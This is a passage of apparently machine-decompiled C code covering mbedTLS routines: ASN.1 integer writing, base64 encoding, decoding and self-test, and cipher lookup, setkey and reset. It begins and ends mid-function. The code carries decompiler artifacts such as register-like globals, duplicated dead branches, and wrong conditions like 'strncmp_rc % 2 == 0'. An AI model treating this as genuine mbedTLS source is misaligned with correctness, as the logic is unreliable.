                if (*(char *)v17 < 0) {
                    // 0x8068f80
                    if (v17 - a2 < 1) {
                        // 0x8068f0a
                        result = -108;
                        // branch -> 0x8068f0f
                    } else {
                        // 0x8068f89
                        g3++;
                        *v16 = v17 - 1;
                        *(char *)(v17 - 1) = 0;
                        // branch -> 0x8068f44
                        // 0x8068f44
                        v11 = mbedtls_asn1_write_len((int32_t *)g7, a2, (char)g3);
                        if (v11 >= 0) {
                            // 0x8068f5b
                            v10 = (int32_t *)g7;
                            v13 = *v10;
                            v12 = v13 - a2;
                            g4 = v12;
                            if (v12 >= 1) {
                                // 0x8068f66
                                v15 = v13 - 1;
                                g4 = v15;
                                *v10 = v15;
                                v14 = g3;
                                *(char *)(v13 - 1) = 2;
                                g3 = v3;
                                g7 = v4;
                                g5 = v2;
                                return v14 + 1 + v11;
                            }
                            // 0x8068f0a
                            result = -108;
                            // branch -> 0x8068f0f
                        } else {
                            result = v11;
                        }
                    }
                    // 0x8068f0f
                    g3 = v3;
                    g7 = v4;
                    g5 = v2;
                    return result;
                }
            }
            // 0x8068f44
            v11 = mbedtls_asn1_write_len((int32_t *)g7, a2, (char)g3);
            if (v11 >= 0) {
                // 0x8068f5b
                v10 = (int32_t *)g7;
                v13 = *v10;
                v12 = v13 - a2;
                g4 = v12;
                if (v12 >= 1) {
                    // 0x8068f66
                    v15 = v13 - 1;
                    g4 = v15;
                    *v10 = v15;
                    v14 = g3;
                    *(char *)(v13 - 1) = 2;
                    g3 = v3;
                    g7 = v4;
                    g5 = v2;
                    return v14 + 1 + v11;
                }
                // 0x8068f0a
                result = -108;
                // branch -> 0x8068f0f
            } else {
                result = v11;
            }
            // 0x8068f0f
            g3 = v3;
            g7 = v4;
            g5 = v2;
            return result;
        }
        result = v9;
    }
    // 0x8068f0f
    g3 = v3;
    g7 = v4;
    g5 = v2;
    return result;
}

// Address range: 0x8068fa0 - 0x806915f
// Used cryptographic patterns:
//  - B64EncodeTable (8-bit, little endian)
int32_t mbedtls_base64_encode(char * a1, uint32_t a2, int32_t * a3, char * a4, int64_t a5) {
    uint32_t v1 = (int32_t)a5;
    int32_t v2 = (int32_t)a4;
    if (v1 == 0) {
        // 0x80690d8
        *a3 = 0;
        return 0;
    }
    int32_t v3 = 0xaaaaaaab * a5 / 0x200000000; // 0x8068fc3
    uint32_t v4 = 3 * v3; // 0x8068fc5
    uint32_t v5 = (int32_t)(v1 != v4) + v3; // 0x8068fd1
    if (v5 > 0x3fffffff) {
        // 0x8069130
        *a3 = -1;
        // branch -> 0x8069092
        // 0x8069092
        return -42;
    }
    uint32_t v6 = 4 * v5 | 1; // 0x8068fe05
    int32_t result; // 0x8069099_2
    if (v6 > a2) {
        // 0x8069143
        *a3 = v6;
        result = -42;
        // branch -> 0x8069092
    } else {
        int32_t v7 = (int32_t)a1;
        int32_t v8 = 0; // 0x80690a0
        if (v4 != 0) {
            int32_t v9 = 0; // 0x806907b42
            while (true) {
                unsigned char v10 = *(char *)v2; // 0x8069008
                unsigned char v11 = *(char *)(v2 + 1); // 0x806900b
                v2 += 3;
                char v12 = *(char *)((int32_t)(v10 / 4) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"); // 0x806901e
                int32_t v13 = (int32_t)*(char *)(v2 + 2); // bp-28
                char v14 = *(char *)(((int32_t)(v11 / 16) | 16 * (int32_t)(v10 % 4)) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"); // 0x806903a
                *(char *)v7 = v12;
                *(char *)(v7 + 1) = v14;
                char v15 = *(char *)((v13 / 64 + 4 * (int32_t)(v11 % 16)) % 64 + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"); // 0x8069052
                *(char *)(v7 + 2) = v15;
                char v16 = *(char *)(v13 % 64 + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"); // 0x8069062
                *(char *)(v7 + 3) = v16;
                int32_t v17 = v7 + 4; // 0x806906c
                int32_t v18 = v9 + 3; // 0x806906f
                if (v4 > v18) {
                    // 0x8069008
                    v7 = v17;
                    v9 = v18;
                    // branch -> 0x8069008
                    continue;
                } else {
                    v7 = v17;
                    v8 = v18;
                }
            }
        }
        int32_t v19 = v7; // 0x8069086
        if (v1 > v8) {
            int32_t v20 = v2; // 0x80690a3
            unsigned char v21 = *(char *)v20; // 0x80690a3
            if (v1 > v8 + 1) {
                // 0x80690f0
                v2 = (int32_t)*(char *)(v20 + 1);
                char v22 = *(char *)((int32_t)(v21 / 4) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"); // 0x80690fc
                *(char *)v7 = v22;
                char v23 = *(char *)((v2 / 16 + 16 * (int32_t)v21) % 64 + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"); // 0x8069116
                *(char *)(v7 + 1) = v23;
                char v24 = *(char *)(4 * (v2 % 16) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"); // 0x8069120
                *(char *)(v7 + 2) = v24;
                // branch -> 0x80690d0
            } else {
                char v25 = *(char *)((int32_t)(v21 / 4) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"); // 0x80690b6
                char v26 = *(char *)(16 * (int32_t)(v21 % 4) + (int32_t)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"); // 0x80690bd
                *(char *)(v7 + 2) = 61;
                *(char *)v7 = v25;
                *(char *)(v7 + 1) = v26;
                // branch -> 0x80690d0
            }
            int32_t v27 = v7 + 3; // 0x80690cd
            *(char *)v27 = 61;
            int32_t v28 = v27 + 1; // 0x80690d3
            v7 = v28;
            v19 = v28;
            // branch -> 0x8069083
        }
        // 0x8069083
        *a3 = v19 - (int32_t)a1;
        *(char *)v7 = 0;
        result = 0;
        // branch -> 0x8069092
    }
    // 0x8069092
    return result;
}

// Address range: 0x8069160 - 0x80693bf
int32_t mbedtls_base64_decode(char * a1, uint32_t a2, int32_t * a3, int32_t a4, int32_t a5) {
    // 0x8069160
    g4 = a4;
    if (a5 == 0) {
        // 0x806937d
        *a3 = 0;
        return 0;
    }
    int32_t v1 = 0;
    int32_t v2 = 0; // 0x806936374
    int32_t v3 = 0; // 0x806936c65
    // branch -> 0x8069190
  lab_0x8069190:
    while (true) {
        // 0x8069190
        int32_t v4; // 0x80691a6
        int32_t v5; // eax
        int32_t v6; // edx
        int32_t v7; // esi
        uint32_t v8; // 0x8069213
        char * v9;
        char * v10;
        char * v11;
        int32_t v12; // 0x806922c
        int32_t v13; // 0x8069253
        int32_t v14; // 0x8069253180
        int32_t v15; // 0x806936376
        int32_t v16; // 0x806936c67
        int32_t v17; // 0x806936c68
        int32_t v18; // 0x8069250
        int32_t v19; // 0x806925b
        unsigned char v20; // 0x806925b
        int32_t v21; // 0x8069295
        int32_t v22; // 0x8069295110
        if (*(char *)(v1 + a4) != 32) {
            // 0x80691ee
            if (v1 != a5) {
                v4 = v1;
                v9 = NULL;
                goto lab_0x80691ba;
            }
            // 0x80691f9
            v7 = a5;
            v12 = a5;
            v15 = v2;
            // branch -> 0x80691fb
            // 0x80691fb
            if (v15 == 0) {
                // 0x806937d
                *a3 = 0;
                return 0;
            }
            // 0x8069206
            v8 = (6 * v15 + 7) / 8 - v3;
            if (v8 <= a2) {
                // 0x806921f
                if (a1 != NULL) {
                    // 0x806922a
                    if (v12 != 0) {
                        // 0x8069234
                        v5 = 0;
                        v6 = 0;
                        v14 = v12;
                        v21 = 0;
                        v19 = 0;
                        v17 = 3;
                        v11 = a1;
                        // branch -> 0x806925b
                        while (true) {
                            // 0x806925b
                            v20 = *(char *)(a4 + v19);
                            if (v20 == 10) {
                                v13 = v14;
                                v18 = v19;
                                v22 = v21;
                                v16 = v17;
                                v10 = v11;
                                goto lab_0x8069250_3;
                            }
                            goto lab_0x8069266_3;
                        }
                    }
                    // 0x8069303
                    *a3 = 0;
                    // branch -> 0x806930a
                    // 0x806930a
                    return 0;
                }
            }
            // 0x806939c
            *a3 = v8;
            // branch -> 0x806930a
            // 0x806930a
            return -42;
        }
        int32_t v23 = v1; // 0x80691a6
        int32_t v24; // 0x806936c69
        while (true) {
            // 0x80691a6
            v4 = v23 + 1;
            int32_t v25 = v4 - v1; // 0x80691ab
            if (v4 < a5) {
                // 0x80691a0
                if (*(char *)(v4 + a4) != 32) {
                    // break -> 0x80691b1
                    break;
                }
                v23 = v4;
                // continue -> 0x80691a6
                continue;
            }
            // 0x80691b1
            int32_t result; // 0x8069311_2
            if (v4 != a5) {
                v9 = (char *)v25;
              lab_0x80691ba:;
                unsigned char v26 = *(char *)(v4 + a4); // 0x8069318
                int32_t v27 = v26; // 0x8069318
                int32_t v28; // 0x806936372
                int32_t v29; // 0x806936c61
                if (a5 - v4 >= 2) {
                    // 0x80691c7
                    if (v26 == 13) {
                        int32_t v30 = v4 + 1; // 0x806932d
                        v7 = v30;
                        int32_t v31; // 0x806936371
                        int32_t v32; // 0x806936c63
                        if (*(char *)(a4 + 1 + v4) == 10) {
                            v31 = v2;
                            v32 = v3;
                          lab_0x80691e4:
                            // 0x80691e4
                            if (v30 >= a5) {
                                v12 = v30;
                                v15 = v31;
                                v24 = v32;
                                // break (via goto) -> 0x80691fb
                                goto lab_0x80691fb;
                            }
                            v1 = v30;
                            v2 = v31;
                            v3 = v32;
                            // continue (via goto) -> 0x8069190
                            goto lab_0x8069190;
                            // 0x806930a
                            return result;
                        }
                      lab_0x8069336:
                        // 0x8069336
                        if (v9 == NULL) {
                            // 0x806933d
                            int32_t v33; // 0x806936c
                            if (v26 == 61) {
                                // 0x806936c
                                v33 = v3 + 1;
                                if (v33 >= 3) {
                                    // 0x8069376
                                    // branch -> 0x806930a
                                    // 0x806930a
                                    return -44;
                                }
                            } else {
                                // 0x8069344
                                v33 = v3;
                                // branch -> 0x806934a
                            }
                            unsigned char v34 = *(char *)(v27 + (int32_t)&g135); // 0x8069350
                            if (v34 != 127) {
                                // 0x806935c
                                if (v33 != 0) {
                                    // 0x80693ab
                                    if (v34 <= 63) {
                                        // 0x8069376
                                        // branch -> 0x806930a
                                        // 0x806930a
                                        return -44;
                                    }
                                }
                                // 0x8069363
                                v28 = v2 + 1;
                                v29 = v33;
                                // branch -> 0x80691e1
                              lab_0x80691e1:;
                                int32_t v35 = v4 + 1; // 0x80691e1
                                v7 = v35;
                                v30 = v35;
                                v31 = v28;
                                v32 = v29;
                                // branch -> 0x80691e4
                                goto lab_0x80691e4;
                            }
                        }
                        // 0x8069376
                        // branch -> 0x806930a
                        // 0x806930a
                        return -44;
                    }
                }
                // 0x80691d6
                if (v26 == 10) {
                    v28 = v2;
                    v29 = v3;
                    goto lab_0x80691e1;
                }
                goto lab_0x8069336;
            }
            // 0x80691f9
            v7 = a5;
            v12 = a5;
            v15 = v2;
            // branch -> 0x80691fb
            // 0x80691fb
            if (v15 == 0) {
                // 0x806937d
                *a3 = 0;
                return 0;
            }
            // 0x8069206
            v8 = (6 * v15 + 7) / 8 - v3;
            if (v8 <= a2) {
                // 0x806921f
                if (a1 != NULL) {
                    // 0x806922a
                    if (v12 == 0) {
                        // 0x8069303
                        *a3 = 0;
                        // branch -> 0x806930a
                        // 0x806930a
                        return 0;
                    }
                    // 0x8069234
                    v5 = 0;
                    v6 = 0;
                    v14 = v12;
                    v21 = 0;
                    v19 = 0;
                    int32_t v36 = a4; // 0x806925b
                    v17 = 3;
                    v11 = a1;
                    // branch -> 0x806925b
                    while (true) {
                        // 0x806925b
                        v20 = *(char *)(v36 + v19);
                        v13 = v14;
                        v18 = v19;
                        v22 = v21;
                        v16 = v17;
                        v10 = v11;
                        char * v37;
                        int32_t v38; // 0x8069253181
                        int32_t v39;
                        int32_t v40; // 0x80692eb
                        int32_t v41; // 0x8069295109
                        if (v20 != 10) {
                          lab_0x8069266_3:
                            // 0x8069266
                            if (v20 != 13) {
                                // 0x806926b
                                if (v20 != 32) {
                                    unsigned char v42 = *(char *)((int32_t)v20 + (int32_t)&g135); // 0x8069276
                                    int32_t v43 = v42 == 64; // 0x8069283
                                    uint32_t v44 = v6; // 0x806928c
                                    int32_t v45 = v21 + 1; // 0x8069295
                                    int32_t v46 = v17 - v43; // 0x8069299
                                    v6 = 64 * v44 | (int32_t)(v42 % 64);
                                    if (v45 == 4) {
                                        char * v47 = v11;
                                        if (v17 != v43) {
                                            // 0x80692b2
                                            *v11 = (char)(v44 / 1024);
                                            int32_t v48 = (int32_t)v11 + 1; // 0x80692bc
                                            int32_t v49 = v48; // edi
                                            char * v50 = (char *)v48;
                                            if (v46 != 1) {
                                                // 0x80692cc
                                                *v50 = (char)(v6 / 256);
                                                int32_t v51 = v49 + 1; // 0x80692d3
                                                v49 = v51;
                                                char * v52 = (char *)v51;
                                                if (v46 != 2) {
                                                    // 0x80692e3
                                                    v5++;
                                                    *v52 = (char)v6;
                                                    v40 = v5;
                                                    char * v53 = (char *)(v49 + 1);
                                                    if (v7 == v40) {
                                                        // 0x80692fd
                                                        // branch -> 0x8069303
                                                        // 0x8069303
                                                        *a3 = (int32_t)v53 - (int32_t)a1;
                                                        // branch -> 0x806930a
                                                        // 0x806930a
                                                        return 0;
                                                    }
                                                    v38 = v7;
                                                    v41 = 0;
                                                    v39 = v46;
                                                    v37 = v53;
                                                  lab_0x806925b:
                                                    // 0x806925b
                                                    v14 = v38;
                                                    v21 = v41;
                                                    v19 = v40;
                                                    v36 = g4;
                                                    v17 = v39;
                                                    v11 = v37;
                                                    // branch -> 0x806925b
                                                    continue;
                                                } else {
                                                    v47 = v52;
                                                }
                                            } else {
                                                v47 = v50;
                                            }
                                        }
                                        // 0x8069390
                                        v13 = v7;
                                        v18 = v5;
                                        v22 = 0;
                                        v16 = v46;
                                        v10 = v47;
                                        // branch -> 0x8069250
                                    } else {
                                        v13 = v14;
                                        v18 = v19;
                                        v22 = v45;
                                        v16 = v46;
                                        v10 = v11;
                                    }
                                } else {
                                    v13 = v14;
                                    v18 = v19;
                                    v22 = v21;
                                    v16 = v17;
                                    v10 = v11;
                                }
                            } else {
                                v13 = v14;
                                v18 = v19;
                                v22 = v21;
                                v16 = v17;
                                v10 = v11;
                            }
                        }
                      lab_0x8069250_3:;
                        int32_t v54 = v18 + 1; // 0x8069250
                        v5 = v54;
                        if (v13 != v54) {
                            v38 = v13;
                            v41 = v22;
                            v40 = v54;
                            v39 = v16;
                            v37 = v10;
                            goto lab_0x806925b;
                        }
                        // 0x80692fd
                        // branch -> 0x8069303
                        // 0x8069303
                        *a3 = (int32_t)v10 - (int32_t)a1;
                        // branch -> 0x806930a
                        // 0x806930a
                        return 0;
                    }
                    // 0x80691fb
                    if (v15 == 0) {
                        // 0x806937d
                        *a3 = 0;
                        return 0;
                    }
                    // 0x8069206
                    v8 = (6 * v15 + 7) / 8 - v24;
                    if (v8 <= a2) {
                        // 0x806921f
                        if (a1 != NULL) {
                            int32_t v55 = 0; // 0x8069306
                            if (v12 != 0) {
                                // 0x8069234
                                v5 = 0;
                                v6 = 0;
                                v14 = v12;
                                v21 = 0;
                                v19 = 0;
                                v36 = a4;
                                v17 = 3;
                                v11 = a1;
                                // branch -> 0x806925b
                                while (true) {
                                    // 0x806925b
                                    v20 = *(char *)(v36 + v19);
                                    if (v20 == 10) {
                                        v13 = v14;
                                        v18 = v19;
                                        v22 = v21;
                                        v16 = v17;
                                        v10 = v11;
                                        goto lab_0x8069250_3;
                                    }
                                    goto lab_0x8069266_3;
                                }
                            }
                            // 0x8069303
                            *a3 = v55;
                            result = 0;
                            // branch -> 0x806930a
                            // 0x806930a
                            return result;
                        }
                    }
                    // 0x806939c
                    *a3 = v8;
                    result = -42;
                    // branch -> 0x806930a
                    // 0x806930a
                    return result;
                }
            }
            // 0x806939c
            *a3 = v8;
            // branch -> 0x806930a
            // 0x806930a
            return -42;
        }
        // 0x80691f9
        v7 = a5;
        v12 = a5;
        v15 = v2;
        v24 = v3;
        // branch -> 0x80691fb
      lab_0x80691fb:
        // 0x80691fb
        if (v15 == 0) {
            // 0x806937d
            *a3 = 0;
            return 0;
        }
        // 0x8069206
        v8 = (6 * v15 + 7) / 8 - v24;
        if (v8 > a2 || a1 == NULL) {
            // 0x806939c
            *a3 = v8;
            // branch -> 0x806930a
            // 0x806930a
            return -42;
        }
        // 0x806922a
        if (v12 != 0) {
            // 0x8069234
            v5 = 0;
            v6 = 0;
            v14 = v12;
            v21 = 0;
            v19 = 0;
            v17 = 3;
            v11 = a1;
            // branch -> 0x806925b
            while (true) {
                // 0x806925b
                v20 = *(char *)(a4 + v19);
                if (v20 == 10) {
                    v13 = v14;
                    v18 = v19;
                    v22 = v21;
                    v16 = v17;
                    v10 = v11;
                    goto lab_0x8069250_3;
                }
                goto lab_0x8069266_3;
            }
        }
        // 0x8069303
        *a3 = 0;
        // branch -> 0x806930a
        // 0x806930a
        return 0;
    }
}

// Address range: 0x80693c0 - 0x80694ff
int32_t mbedtls_base64_self_test(int32_t a1) {
    int32_t v1 = g3; // 0x80693cc
    int32_t v2 = g7; // 0x80693cf
    int32_t v3 = g5; // 0x80693d2
    if (a1 != 0) {
        // 0x80694a8
        printf("  Base64 encoding test: ");
        // branch -> 0x80693dd
    }
    // 0x80693dd
    int32_t v4;
    int32_t v5 = &v4; // 0x80693dd_0
    int32_t str;
    int32_t v6 = &str; // 0x80693e0_0
    g3 = v6;
    int32_t v7 = mbedtls_base64_encode((char *)&str, 128, &v4, (char *)&g134, 64); // 0x806940b
    if (v7 == 0) {
        // 0x806941a
        g7 = (int32_t)"JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==";
        g5 = v6;
        uint32_t strncmp_rc = strncmp("JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==", (char *)&str, 88);
        g237 = strncmp_rc % 2 == 0;
        if (strncmp_rc % 2 == 0) {
            // 0x8069448
            if (a1 == 0) {
                // 0x8069448
                // branch -> 0x8069453
            } else {
                // 0x80694e0
                printf("passed\n  Base64 decoding test: ");
                // branch -> 0x8069453
            }
            // 0x8069453
            if (mbedtls_base64_decode((char *)g3, 128, (int32_t *)v5, (int32_t)"JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==", 88) == 0) {
                uint32_t strncmp_rc2 = strncmp((char *)&g134, (char *)&str, 64);
                g237 = strncmp_rc2 % 2 == 0;
                if (strncmp_rc2 % 2 == 0) {
                    // 0x806948b
                    g1 = 0;
                    if (a1 != 0) {
                        // 0x8069494
                        puts("passed\n");
                        g1 = 0;
                        // branch -> 0x806943a
                    }
                    // 0x806943a
                    g3 = v1;
                    g7 = v2;
                    g5 = v3;
                    return 0;
                }
            }
        }
    }
    // 0x806942a
    g1 = 1;
    if (a1 == 0) {
        // 0x806943a
        g3 = v1;
        g7 = v2;
        g5 = v3;
        return 1;
    }
    // 0x80694c0
    puts("failed");
    g3 = v1;
    g1 = 1;
    g7 = v2;
    g5 = v3;
    return 1;
}

// Address range: 0x8069500 - 0x8069550
int32_t mbedtls_cipher_list(int32_t a1) {
    // 0x8069500
    if (g219 == 0) {
        // 0x8069520
        *(int32_t *)(int32_t)&g226 = 2;
        int32_t v1 = 0; // 0x8069526
        int32_t v2 = *(int32_t *)(2 * v1 + (int32_t)&g137); // 0x8069526
        int32_t v3 = v1 + 4; // 0x8069533
        // branch -> 0x8069520
        while (v2 != 0) {
            // 0x8069520
            *(int32_t *)(v3 + (int32_t)&g226) = v2;
            v1 = v3;
            v2 = *(int32_t *)(2 * v1 + (int32_t)&g137);
            v3 = v1 + 4;
            // continue -> 0x8069520
        }
        // 0x806953a
        *(int32_t *)(v1 + (int32_t)&g227) = 0;
        g219 = 1;
        // branch -> 0x806954a
    }
    // 0x806954a
    g1 = &g226;
    return &g226;
}

// Address range: 0x8069551 - 0x806955f
int32_t function_8069551(void) {
    int32_t result = mbedtls_cipher_info_from_type(0); // 0x8069551
    g1 = result;
    return result;
}

// Address range: 0x8069560 - 0x806958f
int32_t mbedtls_cipher_info_from_type(int32_t a1) {
    // 0x806956f
    g1 = &g138;
    int32_t v1 = g2; // 0x8069565
    g4 = a1;
    g6 = &g136;
    if (a1 == 2) {
        // 0x806958e
        g2 = v1;
        return &g138;
    }
    int32_t v2 = &g136; // 0x8069584
    int32_t result; // 0x8069587
    while (true) {
        int32_t v3 = v2 + 8; // 0x8069584
        g6 = v3;
        result = *(int32_t *)(v2 + 12);
        g1 = result;
        if (result != 0) {
            // 0x8069580
            if (*(int32_t *)v3 == a1) {
                // break -> 0x806958e
                break;
            }
            v2 = v3;
            // continue -> 0x8069584
            continue;
        }
        // 0x806958e
        // branch -> 0x806958e
        // 0x806958e
        g2 = v1;
        return 0;
    }
    // 0x806958e
    // branch -> 0x806958e
    // 0x806958e
    g2 = v1;
    return result;
}

// Address range: 0x8069590 - 0x80695cf
int32_t mbedtls_cipher_info_from_values(int32_t a1, int32_t a2, int32_t a3) {
    // 0x80695a8
    g1 = &g138;
    int32_t v1 = g2; // 0x8069595
    g6 = &g136;
    int32_t v2 = &g136; // 0x80695c1
    int32_t result = &g138; // 0x80695bc
    // branch -> 0x80695b0
    while (true) {
        int32_t v3 = *(int32_t *)(result + 28); // 0x80695b0
        g4 = v3;
        if (*(int32_t *)v3 == a1) {
            // 0x80695b7
            if (*(int32_t *)(result + 8) == a2) {
                // 0x80695bc
                if (*(int32_t *)(result + 4) == a3) {
                    // 0x80695cb
                    g2 = v1;
                    return result;
                }
            }
        }
        int32_t v4 = v2 + 8; // 0x80695c1
        g6 = v4;
        int32_t v5 = *(int32_t *)(v2 + 12); // 0x80695c4
        g1 = v5;
        if (v5 == 0) {
            // break -> 0x80695cb
            break;
        }
        v2 = v4;
        result = v5;
        // continue -> 0x80695b0
    }
    // 0x80695cb
    g2 = v1;
    return 0;
}

// Address range: 0x80695d0 - 0x806960f
int32_t mbedtls_cipher_free(char * a1, int32_t a2) {
    int32_t v1;
    g2 = &v1;
    int32_t v2 = g3; // 0x80695d3
    int32_t v3 = (int32_t)a1;
    g3 = v3;
    int32_t result; // 0x8069607_2
    if (a1 == NULL) {
        // 0x80695d0
        result = g1;
        // branch -> 0x8069602
    } else {
        int32_t v4 = *(int32_t *)(v3 + 60); // 0x80695de
        g1 = v4;
        g237 = v4 == 0;
        if (v4 != 0) {
            int32_t v5 = *(int32_t *)(*(int32_t *)a1 + 28); // 0x80695e7
            g6 = v5;
            ((int32_t (*)(int32_t))*(int32_t *)(v5 + 36))(v4);
            v3 = g3;
            // branch -> 0x80695f0
        }
        // 0x80695f0
        g6 = v3 + 64;
        *(char *)v3 = 0;
        int32_t v6 = v3 + 1; // 0x80695fb
        // branch -> 0x80695f8
        while (v6 != g6) {
            // 0x80695f8
            *(char *)v6 = 0;
            v6++;
            // continue -> 0x80695f8
        }
        // 0x8069602
        result = v6;
        // branch -> 0x8069602
    }
    // 0x8069602
    g3 = v2;
    return result;
}

// Address range: 0x8069610 - 0x80696af
int32_t mbedtls_cipher_setkey(int32_t * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    int32_t v1 = (int32_t)a1;
    int32_t v2;
    int32_t v3 = &v2; // 0x8069610_0
    g2 = v3;
    g1 = v1;
    g4 = a3;
    g3 = a2;
    g6 = a4;
    int32_t v4; // 0x806963d
    if (a1 == NULL) {
        v4 = v3;
        // 0x806962f
        g3 = *(int32_t *)(v4 - 12);
        g7 = *(int32_t *)(v4 - 8);
        g5 = *(int32_t *)(v4 - 4);
        g2 = *(int32_t *)v4;
        return -0x6100;
    }
    int32_t v5 = *a1; // 0x8069648
    g7 = v5;
    if (v5 == 0) {
        v4 = v3;
        // 0x806962f
        g3 = *(int32_t *)(v4 - 12);
        g7 = *(int32_t *)(v4 - 8);
        g5 = *(int32_t *)(v4 - 4);
        g2 = *(int32_t *)v4;
        return -0x6100;
    }
    // 0x806964e
    int32_t v6;
    int32_t v7; // 0x8069690
    int32_t v8;
    int32_t v9; // 0x806967e
    int32_t v10; // 0x806965f
    int32_t v11; // 0x806966c
    if (*(char *)(v5 + 20) == 2) {
        // 0x80696a8
        if (*(int32_t *)(v5 + 8) != a3) {
            v4 = v3;
            // 0x806962f
            g3 = *(int32_t *)(v4 - 12);
            g7 = *(int32_t *)(v4 - 8);
            g5 = *(int32_t *)(v4 - 4);
            g2 = *(int32_t *)v4;
            return -0x6100;
        }
        // 0x8069654
        g237 = a4 == 1;
        *(int32_t *)(v1 + 4) = a3;
        *(int32_t *)(g1 + 8) = g6;
        v8 = g7;
        if (a4 != 1) {
            // 0x806965f
            v10 = *(int32_t *)(v8 + 4);
            g237 = v10 == 3;
            if (v10 != 3) {
                // 0x8069667
                g237 = v10 == 5;
                if (v10 != 5) {
                  lab_0x8069690_2:
                    // 0x8069690
                    v7 = g6;
                    g237 = v7 == 0;
                    if (v7 == 0) {
                      lab_0x8069694:
                        // 0x8069694
                        g6 = *(int32_t *)(g7 + 28);
                        *(int32_t *)(g2 + 16) = g4;
                        *(int32_t *)(g2 + 12) = g3;
                        *(int32_t *)(g2 + 8) = *(int32_t *)(g1 + 60);
                        // branch -> 0x806967e
                        // 0x806967e
                        v6 = *(int32_t *)(g6 + 28);
                        g1 = v6;
                        v9 = g2;
                        g3 = *(int32_t *)(v9 - 12);
                        g7 = *(int32_t *)(v9 - 8);
                        g5 = *(int32_t *)(v9 - 4);
                        g2 = *(int32_t *)v9;
                        ((int32_t (*)())v6)();
                        // branch -> 0x8069690
                        goto lab_0x8069690_2;
                    }
                    // 0x8069690
                    v4 = g2;
                    // branch -> 0x806962f
                    // 0x806962f
                    g3 = *(int32_t *)(v4 - 12);
                    g7 = *(int32_t *)(v4 - 8);
                    g5 = *(int32_t *)(v4 - 4);
                    g2 = *(int32_t *)v4;
                    return -0x6100;
                }
            }
        }
        // 0x806966c
        v11 = *(int32_t *)(v8 + 28);
        g6 = v11;
        // branch -> 0x806967e
        // 0x806967e
        v6 = *(int32_t *)(v11 + 24);
        g1 = v6;
        v9 = g2;
        g3 = *(int32_t *)(v9 - 12);
        g7 = *(int32_t *)(v9 - 8);
        g5 = *(int32_t *)(v9 - 4);
        g2 = *(int32_t *)v9;
        ((int32_t (*)())v6)();
        // branch -> 0x8069690
        goto lab_0x8069690_2;
    }
    // 0x8069654
    g237 = a4 == 1;
    *(int32_t *)(v1 + 4) = a3;
    *(int32_t *)(g1 + 8) = g6;
    v8 = g7;
    if (a4 != 1) {
        // 0x806965f
        v10 = *(int32_t *)(v8 + 4);
        g237 = v10 == 3;
        if (v10 != 3) {
            // 0x8069667
            g237 = v10 == 5;
            if (v10 != 5) {
              lab_0x8069690_5:
                // 0x8069690
                v7 = g6;
                g237 = v7 == 0;
                if (v7 == 0) {
                    goto lab_0x8069694;
                }
                // 0x8069690
                v4 = g2;
                // branch -> 0x806962f
                // 0x806962f
                g3 = *(int32_t *)(v4 - 12);
                g7 = *(int32_t *)(v4 - 8);
                g5 = *(int32_t *)(v4 - 4);
                g2 = *(int32_t *)v4;
                return -0x6100;
            }
            // 0x806966c
            v11 = *(int32_t *)(v8 + 28);
            g6 = v11;
            // branch -> 0x806967e
            // 0x806967e
            v6 = *(int32_t *)(v11 + 24);
            g1 = v6;
            v9 = g2;
            g3 = *(int32_t *)(v9 - 12);
            g7 = *(int32_t *)(v9 - 8);
            g5 = *(int32_t *)(v9 - 4);
            g2 = *(int32_t *)v9;
            ((int32_t (*)())v6)();
            // branch -> 0x8069690
            goto lab_0x8069690_5;
        }
        // 0x806966c
        v11 = *(int32_t *)(v8 + 28);
        g6 = v11;
        // branch -> 0x806967e
        // 0x806967e
        v6 = *(int32_t *)(v11 + 24);
        g1 = v6;
        v9 = g2;
        g3 = *(int32_t *)(v9 - 12);
        g7 = *(int32_t *)(v9 - 8);
        g5 = *(int32_t *)(v9 - 4);
        g2 = *(int32_t *)v9;
        ((int32_t (*)())v6)();
        // branch -> 0x8069690
        goto lab_0x8069690_5;
    }
    // 0x806966c
    v11 = *(int32_t *)(v8 + 28);
    g6 = v11;
    // branch -> 0x806967e
    // 0x806967e
    v6 = *(int32_t *)(v11 + 24);
    g1 = v6;
    v9 = g2;
    g3 = *(int32_t *)(v9 - 12);
    g7 = *(int32_t *)(v9 - 8);
    g5 = *(int32_t *)(v9 - 4);
    g2 = *(int32_t *)v9;
    ((int32_t (*)())v6)();
    // branch -> 0x8069690
    goto lab_0x8069690_5;
}

// Address range: 0x80696b0 - 0x80696df
int32_t mbedtls_cipher_reset(int32_t * a1) {
    // 0x80696b0
    if (a1 == NULL || *a1 == 0) {
        // 0x80696ba
        return -0x6100;
    }
    // 0x80696ce
    *(int32_t *)((int32_t)a1 + 36) = 0;
    return 0;
}

// Address range: 0x80696e0 - 0x806971f
int32_t add_pkcs_padding(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = a2 - a3; // 0x80696f2
    int32_t result2; // 0x806971a_2
    int32_t v2;
    if (a2 == a3) {
        // 0x80696e0
        result2 = g1;
        // branch -> 0x8069713
    } else {
        // 0x80696f9
        g1 = 1;
